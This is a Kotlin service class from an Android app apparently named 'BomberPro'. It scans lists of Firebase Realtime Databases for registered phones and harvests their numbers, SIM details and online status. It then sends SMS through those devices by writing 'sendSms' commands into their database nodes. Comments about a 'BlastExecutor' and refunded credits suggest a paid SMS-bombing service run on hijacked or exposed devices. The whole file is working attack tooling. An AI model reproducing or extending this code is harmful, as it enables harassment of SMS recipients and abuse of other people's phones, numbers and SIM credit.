package com.sanji.bomberpro.services

import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import com.sanji.bomberpro.data.FirebaseNode
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.Dispatcher
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit

data class Device(
    val firebaseUrl: String,
    val firebaseLabel: String,
    val firebaseId: String,
    val deviceId: String,
    val deviceName: String,
    val phone: String?,
    val battery: Int?,
    val sims: List<Map<String, Any?>>,
    val shortId: String,
    val lastSeen: Long,
    val model: String? = null,
    val android: String? = null,
)

data class SendResult(
    val ok: Boolean,
    val deviceId: String,
    val firebaseUrl: String,
    val error: String? = null,
)

data class FirebaseTestResult(
    val firebaseId: String,
    val firebaseLabel: String,
    val httpStatus: Int,
    val totalClients: Int,
    val onlineClients: Int,
    val error: String? = null,
)

class RealtimeDbService {

    private val http: OkHttpClient = run {
        val dispatcher = Dispatcher().apply {
            maxRequests = 200
            maxRequestsPerHost = 200
        }
        OkHttpClient.Builder()
            .connectTimeout(4, TimeUnit.SECONDS)
            .readTimeout(6, TimeUnit.SECONDS)
            .writeTimeout(4, TimeUnit.SECONDS)
            .callTimeout(8, TimeUnit.SECONDS)
            .retryOnConnectionFailure(false)
            .dispatcher(dispatcher)
            .build()
    }

    private val jsonMedia = "application/json; charset=utf-8".toMediaType()
    private val pathCache = ConcurrentHashMap<String, String>()

    companion object {
        private const val TAG = "RealtimeDbService"
        private const val SCAN_CACHE_MS = 5 * 60 * 1000L
        private const val EMPTY_SCAN_CACHE_MS = 15 * 1000L
        private const val PER_FIREBASE_TIMEOUT_MS = 8_000L

        // 10 minutes — was 60 seconds. Devices sleeping for a few mins shouldn't disappear.
        private const val ONLINE_WINDOW_SEC = 600L
    }

    private data class ScanCache(
        val devices: List<Device>,
        val ts: Long,
    )

    private val scanCache = ConcurrentHashMap<String, ScanCache>()

    private fun cacheKey(firebases: List<FirebaseNode>): String =
        firebases.joinToString(",") { "${it.id}|${it.url}" }

    // ============================================================
    //  FIREBASES
    // ============================================================
    suspend fun loadFirebases(): List<FirebaseNode> = withContext(Dispatchers.IO) {
        try {
            val snap = FirebaseFirestore.getInstance()
                .collection(FirebaseConfig.COL_FIREBASES)
                .get().await()

            val list = snap.documents.mapNotNull { doc ->
                val url = doc.getString("url") ?: return@mapNotNull null
                if (url.isBlank()) return@mapNotNull null
                val enabled = doc.getBoolean("enabled") ?: true
                if (!enabled) return@mapNotNull null
                FirebaseNode(
                    id = doc.id,
                    url = url,
                    label = doc.getString("label") ?: "Firebase",
                    enabled = true,
                )
            }

            if (list.isNotEmpty()) list
            else FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        } catch (e: Exception) {
            Log.w(TAG, "loadFirebases failed", e)
            FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        }
    }

    // ============================================================
    //  DEEP TEST — total + online counts for a single firebase
    // ============================================================
    suspend fun testFirebase(fb: FirebaseNode): FirebaseTestResult = withContext(Dispatchers.IO) {
        val baseUrl = fb.url.trimEnd('/')
        val clientsUrl = "$baseUrl/clients.json?shallow=true"

        // Step 1: fetch client IDs
        val clientIds: List<String>
        try {
            val req = Request.Builder()
                .url(clientsUrl)
                .header("Accept", "application/json")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                .get().build()
            val result = http.newCall(req).execute().use { resp ->
                val body = resp.body?.string()?.trim() ?: ""
                when {
                    !resp.isSuccessful -> Pair(
                        when (resp.code) {
                            401 -> "Auth required (rules block read)"
                            403 -> "Forbidden (rules block access)"
                            404 -> "Not found (wrong URL?)"
                            429 -> "Rate limited"
                            in 500..599 -> "Server error ${resp.code}"
                            else -> "HTTP ${resp.code}"
                        },
                        emptyList<String>(),
                    )
                    body.isEmpty() || body == "null" -> Pair(
                        "Empty — no clients registered",
                        emptyList<String>(),
                    )
                    else -> {
                        val ids = mutableListOf<String>()
                        try {
                            val obj = JSONObject(body)
                            val keys = obj.keys()
                            while (keys.hasNext()) ids.add(keys.next())
                        } catch (_: Exception) {}
                        Pair(null, ids)
                    }
                }
            }
            val err = result.first
            clientIds = result.second
            if (err != null) {
                return@withContext FirebaseTestResult(
                    firebaseId = fb.id,
                    firebaseLabel = fb.label,
                    httpStatus = 0,
                    totalClients = 0,
                    onlineClients = 0,
                    error = err,
                )
            }
        } catch (e: Exception) {
            return@withContext FirebaseTestResult(
                firebaseId = fb.id,
                firebaseLabel = fb.label,
                httpStatus = 0,
                totalClients = 0,
                onlineClients = 0,
                error = "Network: ${e.message ?: e.javaClass.simpleName}",
            )
        }

        // Step 2: fetch each device, count online vs total
        val onlineCounter = java.util.concurrent.atomic.AtomicInteger(0)
        val sem = Semaphore(30)

        coroutineScope {
            clientIds.map { devId ->
                async(Dispatchers.IO) {
                    try {
                        sem.withPermit {
                            val obj = fetchDeviceObject(fb, devId) ?: return@withPermit
                            if (isOnline(obj)) onlineCounter.incrementAndGet()
                        }
                    } catch (_: Exception) {}
                }
            }.awaitAll()
        }

        val online = onlineCounter.get()
        val total = clientIds.size
        val errMsg: String? = when {
            online > 0 -> null  // healthy
            total == 0 -> "No clients registered"
            online == 0 -> "$total registered, 0 online (all dead)"
            else -> null
        }

        FirebaseTestResult(
            firebaseId = fb.id,
            firebaseLabel = fb.label,
            httpStatus = 200,
            totalClients = total,
            onlineClients = online,
            error = errMsg,
        )
    }

    // ============================================================
    //  SCAN ALL — per-firebase timeout, partial success
    // ============================================================
    suspend fun scanAll(
        firebases: List<FirebaseNode>,
        forceRefresh: Boolean = false,
        onProgress: ((index: Int, devicesFound: Int) -> Unit)? = null,
    ): List<Device> = withContext(Dispatchers.IO) {
        if (firebases.isEmpty()) return@withContext emptyList<Device>()

        val key = cacheKey(firebases)
        val cached = scanCache[key]

        if (!forceRefresh && cached != null) {
            val age = System.currentTimeMillis() - cached.ts
            val maxAge = if (cached.devices.isEmpty()) EMPTY_SCAN_CACHE_MS else SCAN_CACHE_MS
            if (age < maxAge) {
                Log.d(TAG, "scanAll: cache hit (${cached.devices.size} devices, ${age / 1000}s old)")
                onProgress?.invoke(firebases.size - 1, cached.devices.size)
                return@withContext cached.devices
            }
        }

        Log.d(TAG, "scanAll: fresh scan of ${firebases.size} firebase(s)")

        val deviceSem = Semaphore(200)
        val allFound = java.util.Collections.synchronizedList(mutableListOf<Device>())
        var successCount = 0
        var failedCount = 0

        coroutineScope {
            val jobs = firebases.mapIndexed { idx, fb ->
                async(Dispatchers.IO) {
                    try {
                        val partial = withTimeoutOrNull(PER_FIREBASE_TIMEOUT_MS) {
                            scanFirebase(fb, deviceSem) { _ ->
                                onProgress?.invoke(idx, allFound.size)
                            }
                        }
                        if (partial == null) {
                            Log.w(TAG, "scan timeout for ${fb.label} after ${PER_FIREBASE_TIMEOUT_MS / 1000}s")
                            failedCount++
                        } else {
                            allFound.addAll(partial)
                            successCount++
                            onProgress?.invoke(idx, allFound.size)
                        }
                    } catch (e: CancellationException) {
                        throw e
                    } catch (e: Exception) {
                        Log.w(TAG, "scanFirebase crashed: ${fb.label}", e)
                        failedCount++
                    }
                }
            }
            jobs.awaitAll()
        }

        val final = allFound.toList()
        Log.d(TAG, "scanAll done: ${final.size} device(s) from $successCount ok / $failedCount failed firebase(s)")
        scanCache[key] = ScanCache(final, System.currentTimeMillis())
        final
    }

    private suspend fun scanFirebase(
        fb: FirebaseNode,
        deviceSem: Semaphore,
        onProgress: ((found: Int) -> Unit)? = null,
    ): List<Device> = coroutineScope {
        val baseUrl = fb.url.trimEnd('/')
        val clientsUrl = baseUrl + FirebaseConfig.RTDB_CLIENTS

        val bodyText: String? = try {
            val req = Request.Builder()
                .url(clientsUrl)
                .header("Accept", "application/json")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                .get().build()
            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) {
                    Log.w(TAG, "scan ${fb.label}: HTTP ${resp.code}")
                    null
                } else resp.body?.string()?.trim()
            }
        } catch (e: CancellationException) { throw e }
        catch (e: Exception) {
            Log.w(TAG, "scan ${fb.label} list failed: ${e.message}")
            null
        }

        if (bodyText.isNullOrEmpty() || bodyText == "null") {
            return@coroutineScope emptyList<Device>()
        }

        val idsObj = try { JSONObject(bodyText) }
        catch (_: Exception) { return@coroutineScope emptyList<Device>() }

        val deviceIds = mutableListOf<String>()
        val keys = idsObj.keys()
        while (keys.hasNext()) deviceIds.add(keys.next())
        if (deviceIds.isEmpty()) return@coroutineScope emptyList<Device>()

        val found = java.util.Collections.synchronizedList(mutableListOf<Device>())

        deviceIds.map { devId ->
            async(Dispatchers.IO) {
                try {
                    deviceSem.withPermit {
                        val dev = fetchDevice(fb, devId)
                        if (dev != null) {
                            found.add(dev)
                            onProgress?.invoke(found.size)
                        }
                    }
                } catch (e: CancellationException) { throw e }
                catch (_: Exception) {}
            }
        }.awaitAll()

        found.toList()
    }

    // ============================================================
    //  FETCH DEVICE — full object
    // ============================================================
    private fun fetchDeviceObject(fb: FirebaseNode, devId: String): JSONObject? {
        return try {
            val url = fb.url.trimEnd('/') + "/clients/$devId.json"
            val req = Request.Builder()
                .url(url)
                .header("Accept", "application/json")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                .get().build()
            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return null
                val body = resp.body?.string()?.trim() ?: return null
                if (body.isEmpty() || body == "null") return null
                try { JSONObject(body) } catch (_: Exception) { null }
            }
        } catch (_: Exception) { null }
    }

    private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
        val obj = fetchDeviceObject(fb, devId) ?: return null

        // Accept device if it has ANY usable identity data — even if lastSeen is old.
        // Rationale: an offline device still appears in the list; send attempts to it
        // will fail and BlastExecutor refunds credits. Better than showing 0 devices.
        val hasUsableData =
            obj.has("deviceName") || obj.has("phoneNumber") || obj.has("phone") ||
                    obj.has("number") || obj.has("sims") || obj.has("sim")

        if (!hasUsableData) return null

        val isOnlineNow = isOnline(obj)
        if (!isOnlineNow) {
            // Offline — include only if it has more than just a status field
            val name = obj.optString("deviceName", obj.optString("name", ""))
            val phone = obj.optString("phoneNumber", obj.optString("phone", ""))
            val hasSims = obj.has("sims") || obj.has("sim")
            if (name.isBlank() && phone.isBlank() && !hasSims) return null
        }

        return Device(
            firebaseUrl = fb.url,
            firebaseLabel = fb.label,
            firebaseId = fb.id,
            deviceId = devId,
            deviceName = extractDeviceName(obj),
            phone = extractPhone(obj),
            battery = extractBattery(obj),
            sims = parseSims(obj),
            shortId = shortCode(devId),
            lastSeen = extractLastSeen(obj),
            model = obj.optString("model", obj.optString("deviceModel", null)),
            android = obj.optString("androidVersion", obj.optString("sdk", null)),
        )
    }

    // ============================================================
    //  ONLINE DETECTION — lenient, more field names, longer window
    // ============================================================
    private fun isOnline(obj: JSONObject): Boolean {
        // 1. Explicit online flags
        for (key in listOf("isOnline", "online", "connected", "active", "enabled")) {
            val v = obj.opt(key) ?: continue
            if (v is Boolean && v) return true
            if (v is Number && v.toInt() == 1) return true
            if (v is String) {
                val s = v.lowercase()
                if (s == "true" || s == "yes" || s == "1" || s == "online" || s == "active") return true
            }
        }

        // 2. Status string
        val st = obj.opt("status")
        if (st is Boolean && st) return true
        if (st is String) {
            val s = st.lowercase()
            if (s == "online" || s == "active" || s == "connected" || s == "1") return true
        }

        // 3. lastSeen — try every common name, handle sec/ms/string
        val lastSeenKeys = listOf(
            "lastSeen", "last_seen", "lastOnline", "lastPing",
            "lastConnected", "last_active", "lastActive", "timestamp", "ts",
        )
        for (k in lastSeenKeys) {
            if (!obj.has(k) || obj.isNull(k)) continue
            try {
                var iv = when (val v = obj.opt(k)) {
                    is Number -> v.toLong()
                    is String -> v.toLongOrNull() ?: 0L
                    else -> 0L
                }
                if (iv > 10_000_000_000L) iv /= 1000L
                if (iv > 0 && System.currentTimeMillis() / 1000L - iv < ONLINE_WINDOW_SEC) {
                    return true
                }
            } catch (_: Exception) {}
        }

        return false
    }

    private fun extractDeviceName(obj: JSONObject): String {
        for (k in listOf("deviceName", "name", "model", "device", "brand")) {
            val v = obj.optString(k, "")
            if (v.isNotBlank()) return v.take(64)
        }
        return "device"
    }

    private fun extractPhone(obj: JSONObject): String? {
        val keys = listOf("phoneNumber", "phone", "number", "msisdn", "simNumber", "phone_number", "PhoneNumber", "Phone")
        for (k in keys) {
            val v = obj.optString(k, "")
            if (v.isNotBlank() && v.length >= 7) return v
        }
        val simsArr = obj.optJSONArray("sims") ?: obj.optJSONArray("sim")
        if (simsArr != null) {
            for (i in 0 until simsArr.length()) {
                val s = simsArr.optJSONObject(i) ?: continue
                for (k in keys) {
                    val v = s.optString(k, "")
                    if (v.isNotBlank() && v.length >= 7) return v
                }
            }
        }
        val dev = obj.optJSONObject("device") ?: obj.optJSONObject("deviceInfo")
        if (dev != null) {
            for (k in keys) {
                val v = dev.optString(k, "")
                if (v.isNotBlank() && v.length >= 7) return v
            }
        }
        return null
    }

    private fun extractBattery(obj: JSONObject): Int? {
        for (k in listOf("battery", "batteryLevel", "batteryPercentage")) {
            if (obj.has(k) && !obj.isNull(k)) {
                try {
                    val v = obj.optInt(k, -1)
                    if (v in 0..100) return v
                } catch (_: Exception) {}
            }
        }
        return null
    }

    private fun extractLastSeen(obj: JSONObject): Long {
        for (k in listOf(
            "lastSeen", "last_seen", "lastOnline", "lastPing",
            "lastConnected", "last_active", "lastActive", "timestamp", "ts",
        )) {
            if (obj.has(k) && !obj.isNull(k)) {
                try {
                    var iv = obj.optLong(k, 0L)
                    if (iv > 10_000_000_000L) iv /= 1000L
                    if (iv > 0) return iv
                } catch (_: Exception) {}
            }
        }
        return 0L
    }

    private fun parseSims(obj: JSONObject): List<Map<String, Any?>> {
        val sims = obj.optJSONArray("sims") ?: obj.optJSONArray("sim") ?: return emptyList()
        val out = mutableListOf<Map<String, Any?>>()
        for (i in 0 until sims.length()) {
            val s = sims.optJSONObject(i) ?: continue
            out.add(
                mapOf(
                    "simSlotIndex" to s.optInt("simSlotIndex", s.optInt("slot", 0)),
                    "phoneNumber" to s.optString("phoneNumber", null),
                )
            )
        }
        return out
    }

    private fun shortCode(devId: String): String {
        return if (devId.length <= 8) devId else "${devId.take(4)}…${devId.takeLast(4)}"
    }

    // ============================================================
    //  SEND SMS
    // ============================================================
    suspend fun sendSms(
        firebaseUrl: String,
        deviceId: String,
        simSlot: Int,
        to: String,
        message: String,
    ): SendResult = withContext(Dispatchers.IO) {
        val ts = System.currentTimeMillis() / 1000L
        val toEscaped = escapeJson(to)
        val msgEscaped = escapeJson(message)

        val attempts = listOf(
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":$simSlot,"to":$toEscaped,"message":$msgEscaped,"isSended":false,"timestamp":$ts}"""
            ),
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":"$simSlot","to":$toEscaped,"message":$msgEscaped,"isSended":false,"timestamp":$ts}"""
            ),
            Pair(
                "/clients/$deviceId/messages.json",
                """{"phone":$toEscaped,"text":$msgEscaped,"sim":$simSlot,"timestamp":$ts}"""
            ),
        )

        for ((path, body) in attempts) {
            try {
                val url = firebaseUrl.trimEnd('/') + path
                val req = Request.Builder()
                    .url(url)
                    .header("Accept", "application/json")
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                    .put(body.toRequestBody(jsonMedia))
                    .build()
                http.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        return@withContext SendResult(true, deviceId, firebaseUrl)
                    }
                }
            } catch (e: CancellationException) { throw e }
            catch (_: Exception) {}
        }
        SendResult(false, deviceId, firebaseUrl, "all attempts failed")
    }

    fun getCachedPath(fbId: String, devId: String): String? = pathCache["$fbId:$devId"]
    fun setCachedPath(fbId: String, devId: String, path: String) { pathCache["$fbId:$devId"] = path }
    fun clearPathCache(fbId: String, devId: String) { pathCache.remove("$fbId:$devId") }

    fun invalidateScanCache() { scanCache.clear() }

    private fun escapeJson(s: String): String = JSONObject.quote(s)
}